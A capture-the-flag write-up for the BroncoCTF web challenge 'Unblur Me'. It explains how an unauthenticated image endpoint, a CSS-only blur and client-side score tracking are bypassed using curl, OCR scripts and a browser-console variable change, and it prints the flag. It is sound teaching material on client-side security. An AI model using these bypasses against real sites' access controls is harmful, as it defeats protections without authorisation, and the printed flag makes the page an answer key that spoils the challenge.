# Unblur Me — BroncoCTF Writeup

**Category:** Web   
**Flag:** `BRONCO{1_WOULDNT_M@K3_YOU_DO_C@LCULUS}`


---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Reconnaissance](#reconnaissance)
3. [Finding the Bugs](#finding-the-bugs)
4. [Exploitation](#exploitation)
5. [Flag](#flag)
6. [Key Takeaways](#key-takeaways)

---

## Challenge Overview

The challenge presents a "Calculus Review" web page. The page claims you must solve **500 derivative math problems** to unblur a secret image containing the flag.

![Challenge page showing calculus problems and a blurred image](screenshots/challenge.png)

Each problem randomly generates a derivative question (polynomial, trig, or product rule), and the user must submit the correct answer. A wrong answer resets the counter to 0.

---

## Reconnaissance

### Initial Probe

```bash
curl -v https://broncoctf-unblur-me.chals.io/
```

The response reveals:

- **Server:** Werkzeug (Python Flask)
- **Page loads an image** from `/api/v1/internal/fetch-config-blob`
- **Blur is CSS-only:** `filter: blur(20px)`
- **Score tracking is client-side JavaScript**

### Source Code Analysis

The full HTML/JS source reveals all the logic:

```html
<img id="flag-image" style="filter: blur(20px);">
...
<div class="stats">Progress: <span id="score">0</span> / 500</div>
```

```javascript
let correctCount = 0;

function checkAnswer() {
    const userAnswer = parseInt(document.getElementById('answer').value);
    if (userAnswer === currentAnswer) {
        correctCount++;
        document.getElementById('score').innerText = correctCount;
        if (correctCount >= 500) {
            // UNBLUR THE IMAGE
            flag.style.filter = "none";
        }
    } else {
        alert("WRONG! Starting over.");
        correctCount = 0;
    }
}

function loadSecretImage() {
    fetch('/api/v1/internal/fetch-config-blob')
        .then(response => { return response.blob(); })
        .then(blob => {
            const blobUrl = URL.createObjectURL(blob);
            document.getElementById('flag-image').src = blobUrl;
        });
}
```

---

## Finding the Bugs

Three independent vulnerabilities exist, any one of which is sufficient to solve the challenge:

### Bug #1: Unauthenticated Image API

The endpoint `/api/v1/internal/fetch-config-blob` is called from the client with **no authentication, tokens, cookies, or server-side validation**. It serves the raw PNG image data directly.

### Bug #2: Client-Side Blur (CSS Only)

The image blur is applied entirely through CSS:
```css
filter: blur(20px);
```
The actual PNG file downloaded from the server is **completely sharp and clear**. The blur is cosmetic.

### Bug #3: Client-Side Score Tracking

The variable `correctCount` lives entirely in the browser's JavaScript memory. There is **no server-side validation** of the score. Setting `correctCount = 500` in the console instantly unblurs the image.

---

## Exploitation

### Step 1: Fetch the image directly

Since the API endpoint is unprotected, simply download the image with `curl`:

```bash
curl -s -o flag.png \
  https://broncoctf-unblur-me.chals.io/api/v1/internal/fetch-config-blob

file flag.png
# Output: PNG image data, 1648 x 928, 8-bit/color RGBA
```

The image is a valid, high-resolution PNG — no blur in the actual pixel data.

### Step 2: Verify the image is sharp (Python + OpenCV)

Before wasting time on OCR, confirm the blur is purely cosmetic. The Laplacian variance test measures sharpness — values above 100 indicate a sharp image, and this one scores **449**:

```python
import cv2
import numpy as np

img = cv2.imread("flag.png")
blur = cv2.Laplacian(img, cv2.CV_64F).var()
print(f"Laplacian variance: {blur}")
# Output: 449.13 — image is sharp, blur is CSS-only
```

### Step 3: OCR with image preprocessing (Python + tesseract)

The raw image needs preprocessing for best OCR results. Use CLAHE (contrast enhancement), adaptive thresholding, and sharpening:

```python
import cv2
import numpy as np
import pytesseract

img = cv2.imread("flag.png")
gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)

# Enhance contrast
clahe = cv2.createCLAHE(clipLimit=3.0, tileGridSize=(8,8))
enhanced = clahe.apply(gray)

# Scale up 3x for better OCR resolution
big = cv2.resize(enhanced, None, fx=3, fy=3, interpolation=cv2.INTER_CUBIC)

# Denoise
denoised = cv2.fastNlMeansDenoising(big, None, 10, 7, 21)

# Sharpen
kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
sharpened = cv2.filter2D(denoised, -1, kernel)

# OTSU binary threshold
_, thresh = cv2.threshold(sharpened, 0, 255,
                          cv2.THRESH_BINARY + cv2.THRESH_OTSU)
thresh_inv = cv2.bitwise_not(thresh)

# OCR
text = pytesseract.image_to_string(thresh_inv, config='--psm 6 --oem 3')
print(text)
```

Install tesseract and run:

```bash
sudo apt-get install -y tesseract-ocr
python3 ocr_extract.py
```

Output:
```
BRONCO{1_WOULDNT
M@K3 YOU DO_
C@LCULUS}
```

The flag is revealed in three lines.

### Step 3 (Alternative): Browser Console

If you prefer a browser-based approach, open the challenge page and run in the dev console:

```javascript
correctCount = 500;
checkAnswer();
```

This triggers the client-side unblur and reveals the flag image instantly.

---

## Flag

```
BRONCO{1_WOULDNT_M@K3_YOU_DO_C@LCULUS}
```

The flag is a leet-speak reference to the meme *"I wouldn't make you do all that calculus"* — a tongue-in-cheek acknowledgment that the 500-derivative grind was never intended to be the real solution.

---

## Key Takeaways

| # | Lesson |
|---|--------|
| 1 | **Always check for unprotected API endpoints** — if the client can fetch something, so can you with `curl` |
| 2 | **CSS != security** — `filter: blur()` is cosmetic, not a protection mechanism |
| 3 | **Client-side checks are meaningless** — any logic running in the browser can be bypassed |
| 4 | **Read the source** — the page HTML/JS reveals exactly what's happening and where the vulnerabilities are |
| 5 | **Follow the hint** — "exploit the simplest bug" and "use mitm" were strong signals to look at network requests |

The challenge was designed to teach that **obscurity and client-side controls are not security**. No matter how many math problems you gate-keep behind, if the image is loaded directly from an unprotected endpoint, the flag is yours for the taking.
